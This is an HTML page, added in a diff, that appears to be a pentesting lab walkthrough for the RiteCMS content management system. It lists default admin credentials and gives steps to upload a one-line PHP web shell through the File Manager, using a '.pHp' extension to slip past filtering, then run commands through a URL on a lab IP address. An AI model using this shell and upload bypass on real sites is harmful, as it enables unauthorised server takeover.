@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/styles/walkthroughs.css">
+        <link href="/styles/prism/prism.css" rel="stylesheet" />
+        <link rel="icon" type="image/x-icon" href="/images/favicon2.png">
+    <script src="/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>RiteCMS</h1>
+            <p>RiteCMS is a lightweight, open-source content management system designed for simplicity and ease of use. It provides a user-friendly interface for managing website content without requiring extensive technical knowledge.</p>
+            </ul>
+            
+            <h2>Enumeration</h2>
+            <ul>
+                <h3>Default credentials</h3>
+                <pre><code class="language-bash">admin:admin
+admin:password</code></pre>
+            </ul>
+            <h2>Exploitation</h2>
+            <ul>
+                <p>Once inside the admin panel you can upload your malicious shell. Follow the steps below:</p>
+                <p>Go to <b>admin</b> (At the bottom of the page)</p>
+                <p>Go to <b>File Manager</b> and upload your shell</p>
+                <p>It is recommended to upload a shell with the following extension: <b>.pHp</b></p>
+                <pre><code class="language-php">&lt;?php system($_GET["cmd"]); ?> #Here is a shell example</code></pre>
+                
+                <p>Once uploaded, you can access your shell by navigating to the following path</p>
+                <pre><code class="language-bash">http://192.168.224.249:8000/cms/media/shell.pHp?cmd=whoami</code></pre>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
